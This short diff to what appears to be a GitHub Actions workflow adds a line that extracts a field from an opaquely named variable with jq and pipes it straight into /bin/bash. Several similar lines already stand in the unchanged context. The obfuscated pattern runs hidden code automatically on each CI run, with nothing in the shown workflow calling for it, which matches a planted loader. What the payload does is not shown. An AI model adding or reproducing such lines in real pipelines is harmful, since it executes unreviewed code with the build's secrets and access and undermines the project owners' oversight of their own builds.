@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$r4" | jq -r .p9 | /bin/bash
           echo $kteji28 | jq -r .lr9 | /bin/bash
           echo $uez4 | jq -r .adu2 | /bin/bash
+          echo $dbxk2290 | jq -r .is37934 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
